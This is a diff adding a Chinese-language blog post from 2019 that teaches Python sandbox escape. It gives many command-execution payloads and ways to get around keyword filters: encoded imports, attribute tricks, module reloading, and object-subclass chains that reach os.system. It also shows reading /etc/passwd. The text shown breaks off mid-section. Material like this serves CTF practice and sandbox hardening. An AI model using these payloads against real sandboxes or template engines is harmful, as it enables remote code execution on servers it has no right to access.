@@ -1,0 +1,959 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/lihuaiqiu.jpg?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/lihuaiqiu.jpg?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Web安全," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="离怀秋" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="前言本来计划两天内出完这篇Blog的，结果被mfc小学期以及想玩的心态拖着.(拖到了6天),接下来要加把劲啊！ python沙箱逃逸介绍python沙箱逃逸用于一些沙箱环境(如被禁止掉关键系统函数的python环境)，如一些OJ网站或者jinja2这类模板解释器。而沙箱逃逸的目的则是绕过对关键系统函数的限制，在对方服务器上运行我们的恶意代码，甚至getshell。 Python中可执行代码命令的模">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Python沙箱逃逸">
+<meta property="og:url" content="http://yoursite.com/2019/07/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/index.html">
+<meta property="og:site_name" content="离怀秋">
+<meta property="og:description" content="前言本来计划两天内出完这篇Blog的，结果被mfc小学期以及想玩的心态拖着.(拖到了6天),接下来要加把劲啊！ python沙箱逃逸介绍python沙箱逃逸用于一些沙箱环境(如被禁止掉关键系统函数的python环境)，如一些OJ网站或者jinja2这类模板解释器。而沙箱逃逸的目的则是绕过对关键系统函数的限制，在对方服务器上运行我们的恶意代码，甚至getshell。 Python中可执行代码命令的模">
+<meta property="og:image" content="https://s2.ax1x.com/2019/07/05/ZajKEQ.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/07/05/Zdinbt.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/07/06/Zw8qtU.png">
+<meta property="article:published_time" content="2019-07-06T08:24:03.000Z">
+<meta property="article:modified_time" content="2019-07-06T11:44:26.000Z">
+<meta property="article:author" content="离怀秋">
+<meta property="article:tag" content="Web安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.ax1x.com/2019/07/05/ZajKEQ.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/07/06/Python沙箱逃逸/"/>
+
+
+
+
+
+  <title>Python沙箱逃逸 | 离怀秋</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+    <a href="https://github.com/lihuaiqiu" target="_blank" rel="noopener" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">离怀秋</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">穷且益坚，不负青云之志</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="离怀秋">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="离怀秋">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Python沙箱逃逸</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-06T16:24:03+08:00">
+                2019-07-06
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本来计划两天内出完这篇<code>Blog</code>的，结果被<code>mfc</code>小学期以及想玩的心态拖着.(拖到了6天),接下来要加把劲啊！</p>
+<h3 id="python沙箱逃逸介绍"><a href="#python沙箱逃逸介绍" class="headerlink" title="python沙箱逃逸介绍"></a>python沙箱逃逸介绍</h3><p><code>python</code>沙箱逃逸用于一些沙箱环境(如被禁止掉关键系统函数的<code>python</code>环境)，如一些<code>OJ</code>网站或者<code>jinja2</code>这类模板解释器。而沙箱逃逸的目的则是绕过对关键系统函数的限制，在对方服务器上运行我们的恶意代码，甚至<code>getshell</code>。</p>
+<h3 id="Python中可执行代码命令的模板以及函数"><a href="#Python中可执行代码命令的模板以及函数" class="headerlink" title="Python中可执行代码命令的模板以及函数"></a>Python中可执行代码命令的模板以及函数</h3><ul>
+<li><code>os</code>模块</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">'whoami'</span>)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>exec</code>代码执行</li>
+</ul>
+<p><code>exec(&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;)</code></p>
+<ul>
+<li><code>eval</code>代码执行</li>
+</ul>
+<p><code>eval(&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;)</code></p>
+<ul>
+<li>利用<code>timeit</code>模块与<code>timeit</code>函数</li>
+</ul>
+<p><code>timeit</code>函数介绍:计算一小段<code>python</code>代码的执行时间。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> timeit</span><br><span class="line"></span><br><span class="line">timeit.timeit(<span class="string">"__import__('os').system('ls')"</span>,number=<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>platform</code>模块</li>
+</ul>
+<p><code>platform</code>模板可以提供很多方法去获取目标系统的操作信息，如<code>platform.system</code>等函数。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"></span><br><span class="line">platform.popen(<span class="string">'whoami'</span>).read()</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>commands</code>模块</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> commands</span><br><span class="line"></span><br><span class="line">commands.getoutput(<span class="string">'whoami'</span>)</span><br><span class="line"></span><br><span class="line">commands.getstatusoutpur(<span class="string">'whoami'</span>)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>subprocess</code>模块</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">subprocess.call([<span class="string">'whoami'</span>],shell=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>通过<code>types</code>模块和<code>FileType</code>函数进行文件读取</li>
+</ul>
+<p><code>types</code>模块定义了<code>python</code>的很多类型，其中<code>FileType</code>函数可以用来打开文件进行文件读取.</p>
+<p><img src="https://s2.ax1x.com/2019/07/05/ZajKEQ.png" alt="ZajKEQ.png"></p>
+<ul>
+<li>其他文件读取操作</li>
+</ul>
+<p><code>file(&#39;xxx.txt&#39;).read()</code></p>
+<p><code>open(&#39;xxx.txt&#39;).read()</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"></span><br><span class="line">codecs.open(<span class="string">'xxx.txt'</span>).read()</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>f修饰符</code>进行命令执行</li>
+</ul>
+<p>此命令执行方法只限于<code>python3.6</code>以上的版本</p>
+<p>用法：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">f'<span class="subst">&#123;__import__(<span class="string">"os"</span>).system(<span class="string">"dir"</span>)&#125;</span>'</span></span><br><span class="line"></span><br><span class="line"><span class="string">f'<span class="subst">&#123;open(<span class="string">'xxx.txt'</span>).read()&#125;</span>'</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>动态加载类和函数</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(<span class="string">"os"</span>).system(<span class="string">"ls"</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="花式命令执行绕过逃逸"><a href="#花式命令执行绕过逃逸" class="headerlink" title="花式命令执行绕过逃逸"></a>花式命令执行绕过逃逸</h3><h4 id="dict-与dir-函数"><a href="#dict-与dir-函数" class="headerlink" title="__dict__与dir()函数"></a><code>__dict__</code>与<code>dir()</code>函数</h4><h5 id="dir-函数"><a href="#dir-函数" class="headerlink" title="dir()函数"></a><code>dir()</code>函数</h5><p><img src="https://s2.ax1x.com/2019/07/05/Zdinbt.png" alt="Zdinbt.png"></p>
+<p>先看一下简单的介绍，简单来讲<code>dir()</code>函数就是：<strong>无参数时，返回当前范围内的变量，方法等，有参数时，返回参数的属性方法等</strong></p>
+<p>通过<code>dir(__builtins__)</code>可以查看所有内置函数以及私有属性,不过在<code>python3</code>中<code>builtins</code>是一个模块，需要先进行<code>import</code>再进行<code>dir</code>。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#39;ArithmeticError&#39;, &#39;AssertionError&#39;, &#39;AttributeError&#39;, &#39;BaseException&#39;, &#39;BufferError&#39;, &#39;BytesWarning&#39;, &#39;DeprecationWarning&#39;, &#39;EOFError&#39;, &#39;Ellipsis&#39;, &#39;EnvironmentError&#39;, &#39;Exception&#39;, &#39;False&#39;, &#39;FloatingPointError&#39;, &#39;FutureWarning&#39;, &#39;GeneratorExit&#39;, &#39;IOError&#39;, &#39;ImportError&#39;, &#39;ImportWarning&#39;, &#39;IndentationError&#39;, &#39;IndexError&#39;, &#39;KeyError&#39;, &#39;KeyboardInterrupt&#39;, &#39;LookupError&#39;, &#39;MemoryError&#39;, -ge&#39;, &#39;raw_input&#39;, &#39;reduce&#39;, &#39;reload&#39;, &#39;repr&#39;, &#39;reversed&#39;, &#39;round&#39;, &#39;set&#39;, &#39;setattr&#39;, &#39;slice&#39;, &#39;sorted&#39;, &#39;staticmethod&#39;, &#39;str&#39;, &#39;sum&#39;, &#39;super&#39;, &#39;tuple&#39;, &#39;type&#39;, &#39;unichr&#39;, &#39;unicode&#39;, &#39;vars&#39;, &#39;xrange&#39;, &#39;zip&#39;]</span><br></pre></td></tr></table></figure>
+
+<p>可以看出平时我们所有的<code>chr,open</code>等函数其实就是</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__builtin__.open()</span><br><span class="line"></span><br><span class="line">__builtin__.chr()</span><br></pre></td></tr></table></figure>
+
+<p>我们还可以通过<code>open</code>函数进行敏感文件读取</p>
+<p><code>__builtins__.open(&#39;/etc/passwd&#39;).read()</code></p>
+<h5 id="dict-方法"><a href="#dict-方法" class="headerlink" title="__dict__方法"></a><code>__dict__</code>方法</h5><p><code>dict</code>与<code>dir()</code>都是都是列出一个<strong>模板/类/对象</strong>下面所有的<strong>属性和函数</strong>，下面两句是等价的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> __builtins__.__dict__[<span class="string">'__import__'</span>](<span class="string">'os'</span>).system(<span class="string">'whoami'</span>)</span><br><span class="line"></span><br><span class="line">__builtins__.__import__(<span class="string">'os'</span>).system(<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure>
+
+<p>不过..这有什么用呢(<strong>当然是回到最初的起点考虑—–&gt;绕过</strong>),通过<code>__dict__</code>,即便过滤了<code>import</code>，我们完全可以通过<code>base64</code>编码加<code>__dict__</code>进行一波绕过</p>
+<p><code>payload</code>如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.__dict__[<span class="string">'X19pbXBvcnRfXw=='</span>.decode(<span class="string">'base64'</span>)](<span class="string">'b3M='</span>.decode(<span class="string">'base64'</span>)).system(<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure>
+
+<h4 id="importlib动态导入模块命令执行"><a href="#importlib动态导入模块命令执行" class="headerlink" title="importlib动态导入模块命令执行"></a><code>importlib</code>动态导入模块命令执行</h4><h5 id="无绕过payload"><a href="#无绕过payload" class="headerlink" title="无绕过payload"></a>无绕过payload</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> importlib</span><br><span class="line"></span><br><span class="line">importlib.import_module(<span class="string">'os'</span>).system(<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure>
+
+<h5 id="绕过payload"><a href="#绕过payload" class="headerlink" title="绕过payload"></a>绕过payload</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> importlib</span><br><span class="line"></span><br><span class="line">importlib.import_module(<span class="string">'b3M='</span>.decode(<span class="string">'base64'</span>)).system(<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure>
+
+<h4 id="getattr-和-getattribute"><a href="#getattr-和-getattribute" class="headerlink" title="__getattr__和__getattribute__"></a><strong><code>__getattr__</code></strong>和<code>__getattribute__</code></h4><p>其实这里最常用的是<code>__getattribute__</code>，当我们构造的如下继承链(后面会说明)，遭到了关键性名词的过滤，如下面的例子：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">"linecache"</span>].__dict__[<span class="string">'o'</span>+<span class="string">'s'</span>].__dict__[<span class="string">'system'</span>](<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure>
+
+<p>如果这里过滤了<code>ls</code>命令,那么<code>func_globals</code>以及<code>__globals__</code>都无法使用，我们就可以使用<code>__getattribute__</code>进行绕过，两个魔法函数用法定义如下：</p>
+<ol>
+<li>如果在类中定义了<code>__getattr__()</code>这个方法，那么在对象查询属性时,如果这个属性在类中定义了，如一个已经实例化的对象x定义了属性name，那么在使用x.name时就不会调用<code>__getattr__(</code>name<code>)</code>；会直接返回name已经定义好的值。简单的说：<code>__getattr__()</code>会在对象中不存在这个属性时被调用。</li>
+<li>如果在类定义了<code>__getattribute__()</code>方法，那么它无条件被调用。当实例化的对象每次引用属性和方法时都会先调用它。如果属性查找不到那么就会引发<code>AttributeError</code>的异常。除非在类中同时定义了<code>__getattribute__()</code>和<code>__getattr__()</code>两个方法。</li>
+</ol>
+<p>所以最终的绕过payload为:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">59</span>].__init__.__getattribute__(<span class="string">'func_global'</span>+<span class="string">'s'</span>)[<span class="string">"linecache"</span>].__dict__[<span class="string">'o'</span>+<span class="string">'s'</span>].__dict__[<span class="string">'system'</span>](<span class="string">'l'</span>+<span class="string">'s'</span>)</span><br></pre></td></tr></table></figure>
+
+<p>利用调用属性<code>func_globals</code>(其实就是<code>__globals__</code>)(<strong>利用func_globals可以返回对应类的所有调用基类与函数</strong>)，最终绕过过滤。</p>
+<p>其实<code>__getattribute__</code>与<code>__getattr__</code>不仅只支持对象，<code>module</code>也是支持的，这是郁师傅文章中的两个例子</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">getattr(__import__(<span class="string">"os"</span>),<span class="string">"flfgrz"</span>.encode(<span class="string">"rot13"</span>))(<span class="string">'ls'</span>)</span><br><span class="line"></span><br><span class="line">getattr(__import__(<span class="string">"os"</span>),<span class="string">"metsys"</span>[::<span class="number">-1</span>])(<span class="string">'ls'</span>)</span><br><span class="line"></span><br><span class="line">__import__(<span class="string">"os"</span>).__getattribute__(<span class="string">"metsys"</span>[::<span class="number">-1</span>])(<span class="string">'ls'</span>)</span><br><span class="line"></span><br><span class="line">__import__(<span class="string">"os"</span>).__getattribute__(<span class="string">"flfgrz"</span>.encode(<span class="string">"rot13"</span>))(<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure>
+
+<p>虽然<code>__import__(&#39;os&#39;)__</code>是一个模板，<strong>但是也可以通过<code>__getattribute__</code>去调用属性，判断我们的属性是否存在，这里我们调用其实是<code>system</code>，所以属性存在，直接返回原来的属性system，完成系统命令执行。</strong></p>
+<h4 id="花式重载以及引入"><a href="#花式重载以及引入" class="headerlink" title="花式重载以及引入"></a>花式重载以及引入</h4><h5 id="引入模块路径"><a href="#引入模块路径" class="headerlink" title="引入模块路径"></a>引入模块路径</h5><p>当一个沙箱环境中缺少了<code>os</code>等模块，如通过代码<code>sys.modules[&#39;os&#39;]=None</code>将<code>os</code>模块限制，但是我们还可以通过路径引入，在<code>linux</code>环境下，os模块的默认路径为<strong>usr/lib/python2.7/os.py</strong>,我们可以再次通过引入<code>os</code>模块路径，再次进行命令执行。代码测试如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.modules[<span class="string">'os'</span>]=<span class="literal">None</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">ImportError: No module named os</span><br><span class="line">sys.modules[<span class="string">'os'</span>]=<span class="string">'/usr/lib/python2.7/os.py'</span></span><br><span class="line"><span class="keyword">import</span> os</span><br></pre></td></tr></table></figure>
+
+<p>成功在os模块被限制的情况下成功进行了引入。</p>
+<h5 id="reload方法进行重载"><a href="#reload方法进行重载" class="headerlink" title="reload方法进行重载"></a>reload方法进行重载</h5><p>在python中，不用引入直接使用的内置函数为<code>builtin</code>函数，随着<code>__builtins__</code>模板自动引入当前华，在前面我们也说过<code>chr()</code>函数其实相当于<code>__builtin__.chr()</code>,但是如果我们把这些函数从<code>__builtin__</code>中删除，就再也无法调用这些函数了。如：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">del</span> __builtins__.chr</span><br><span class="line">chr(<span class="number">97</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">NameError: name <span class="string">'chr'</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br><span class="line"> reload(__builtins__)</span><br><span class="line">&lt;module <span class="string">'__builtin__'</span> (built-<span class="keyword">in</span>)&gt;</span><br><span class="line"> chr(<span class="number">97</span>)</span><br><span class="line"><span class="string">'a'</span></span><br></pre></td></tr></table></figure>
+
+<p>同样，如果在<code>__builtins__</code>删除掉了<code>__import__</code>,<code>eval</code>,<code>execfile</code>等函数，那么我们就无法进行危险函数调用了，所以这里可以通过<code>reload</code>再次将所有危险方法重载一次。<strong>但是reload也是<code>__builtin__</code>下面的函数，如果将reload过滤掉，我们就没法重载了，但是,python中还有一个模块叫做<code>imp</code>,是一个与引入相关的模块，通过如下代码，我们可以再次引入。</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">del</span> __builtins__.chr</span><br><span class="line"> chr(<span class="number">97</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">NameError: name <span class="string">'chr'</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br><span class="line"> <span class="keyword">import</span> imp</span><br><span class="line"> imp.reload(__builtins__)</span><br><span class="line">&lt;module <span class="string">'__builtin__'</span> (built-<span class="keyword">in</span>)&gt;</span><br><span class="line"> chr(<span class="number">97</span>)</span><br><span class="line"><span class="string">'a'</span></span><br></pre></td></tr></table></figure>
+
+<p>同样在没过滤<code>execfile</code>函数的情况下，还可以通过<code>execfile</code>进行加载模板文件.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">execfile(<span class="string">'/usr/lib/python2.7/os.py'</span>)</span><br><span class="line"></span><br><span class="line">system(<span class="string">'whoami'</span>)</span><br></pre></td></tr></table></figure>
+
+<h4 id="引入objecb命令执行"><a href="#引入objecb命令执行" class="headerlink" title="引入objecb命令执行"></a>引入objecb命令执行</h4><p>这里自己踩了几个定义不清晰的坑点，也来说一下。</p>
+<p><code>python</code>的<code>object</code>类中集成了很多基础函数，在我们想调用这些函数也是通过调用<code>object</code>去操作的,而<code>object类</code>主要通过<code>__mro__</code>和<code>__bases__</code>两种方式来创建，如下是创建方法</p>
+<p>首先大概看一下这个两个<code>tuple</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__mro__</span><br><span class="line">(&lt;type <span class="string">'tuple'</span>&gt;, &lt;type <span class="string">'object'</span>&gt;)</span><br><span class="line">().__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">&lt;type <span class="string">'object'</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<p>所以创建一个<code>object</code>大概有如下几种方法：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>]</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">[].__class__.__mro__[<span class="number">2</span>]</span><br><span class="line">&#123;&#125;.__class__.__bases__[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>
+
+<p>这里再来介绍一下常见的一些属性，可以更好的理解构造的<strong>命令执行继承链条</strong></p>
